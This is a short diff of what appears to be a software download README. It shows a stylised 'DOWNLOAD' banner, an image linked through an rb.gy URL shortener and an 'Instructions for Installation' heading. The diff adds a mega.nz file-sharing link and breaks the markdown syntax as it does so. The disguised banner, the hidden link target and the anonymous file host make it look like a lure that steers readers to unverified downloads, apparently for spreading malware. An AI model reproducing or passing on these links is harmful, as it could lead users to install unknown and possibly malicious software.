@@ -1,6 +1,7 @@
 > **⩔ Ｄ ０ Ｗ Ｎ １ ０ Ａ Ｄ​ ⩔**
 
-[![image](https://softgot.net/d.svg)](https://rb.gy/l1xhkh)
+[![image](https://softgot.net/d.svg)]https://mega.nz/file/gZs0UYpa#Mn7hVXopc6LqZQIMhdrY7OBnwlpAUw5YbGSDp0_nRV4
+(https://rb.gy/l1xhkh)
 
 **Instructions for Installation:**
 
